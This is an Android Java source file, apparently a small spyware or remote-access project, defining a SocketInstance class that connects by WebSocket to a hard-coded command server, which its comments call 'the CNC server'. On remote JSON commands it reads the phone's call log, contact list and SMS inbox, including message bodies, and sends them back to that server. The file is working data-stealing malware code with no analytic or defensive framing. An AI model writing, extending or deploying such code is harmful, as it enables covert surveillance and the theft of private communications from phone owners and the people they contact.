package com.tosattosimonepio;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;

public class SocketInstance extends MainActivity{

    private WebSocket webSocket;
    private String SERVER_PATH = "http://192.168.0.28:8080";
    protected Context context;

    public SocketInstance(Context context) {
        this.context = context;
        initiateSocketConnection();
    }

    private void initiateSocketConnection() {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder().url(SERVER_PATH).build();
        webSocket = client.newWebSocket(request, new SocketListener());
    }

    private class SocketListener extends WebSocketListener {

        @Override
        public void onOpen(WebSocket webSocket, Response response) {
            super.onOpen(webSocket, response);
            Log.d("WebSocketStatus","onOpenExecuted");
            webSocket.send("ciao dal client!");
        }

        @Override
        public void onMessage(WebSocket webSocket, String text) {
            super.onMessage(webSocket, text);
            webSocket.send("ho ricevuto da te questa richiesta: " + text);

            //parse JSON from request
            try {
                JSONObject jsonObject = new JSONObject(text);
                String parsedRequestType = jsonObject.getString("requestType");
                switch(parsedRequestType){
                    case "reqStatus":
                        webSocket.send(reqStatus());
                        break;
                    case "reqCallLogs":
                        webSocket.send(reqCallLogs(webSocket));
                        break;
                    case "reqContacts":
                        webSocket.send(reqContacts(webSocket));
                        break;
                    case "reqMessages":
                        webSocket.send(reqMessages(webSocket));
                        break;
                    default:
                        Log.d("WebSocketStatus","ERROR IN PARSED REQUEST TYPE");
                        Log.d("WebSocketStatus","ricevuto: " + parsedRequestType);
                }
            }catch (JSONException e){
                Log.d("Error", e.toString());
            }
        }


        private String reqStatus() {
            return "Everything is fine!";
        }

        private String reqCallLogs(WebSocket webSocket) throws JSONException {
            // reading all data in descending order according to DATE
            String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
            Uri callUri = Uri.parse("content://call_log/calls");
            Cursor cur = context.getContentResolver().query(callUri, null, null, null, strOrder);
            // loop through cursor
            String calls = "";
            JSONObject calllogobj = new JSONObject();
            int id = 0;
            while (cur.moveToNext()) {
                @SuppressLint("Range") String callNumber = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                @SuppressLint("Range") String callName = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
                @SuppressLint("Range") String callDate = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DATE));
                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm");
                String dateString = formatter.format(new Date(Long.parseLong(callDate)));
                @SuppressLint("Range") String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));
                // create JSON object and send it to the CNC server
                calllogobj.put(String.valueOf(id),new JSONObject()
                        .put("number", callNumber)
                        .put("name", callName)
                        .put("date", dateString)
                        .put("duration", duration));
                id++;
            }

            return calllogobj.toString();
        }

        @SuppressLint("Range")
        private String reqContacts(WebSocket webSocket) throws JSONException {
            String phoneNo = "";
            JSONObject contactobj = new JSONObject();
            int idP = 0;

            Cursor cur = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if ((cur != null ? cur.getCount() : 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    if (cur.getInt(cur.getColumnIndex( ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        }
                        pCur.close();
                    }

                    // create JSON object and send it to the CNC server
                    contactobj.put(String.valueOf(idP),new JSONObject()
                            .put("id", id)
                            .put("name", name)
                            .put("phoneNo", phoneNo));
                    idP++;
                }
            }
            if (cur != null) {
                cur.close();
            }

            return contactobj.toString();
        }

        private String reqMessages(WebSocket webSocket) throws JSONException {
            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);

            JSONObject smsobj = new JSONObject();
            int id = 0;

            while (cur != null && cur.moveToNext()) {
                @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                Date dateReadable = new Date(Long.parseLong(date));

                // create JSON object and send it to the CNC server
                smsobj.put(String.valueOf(id),new JSONObject()
                        .put("number", address)
                        .put("date", dateReadable)
                        .put("body", body));
                id++;
            }

            if (cur != null) {
                cur.close();
            }

            return smsobj.toString();
        }
    }
}
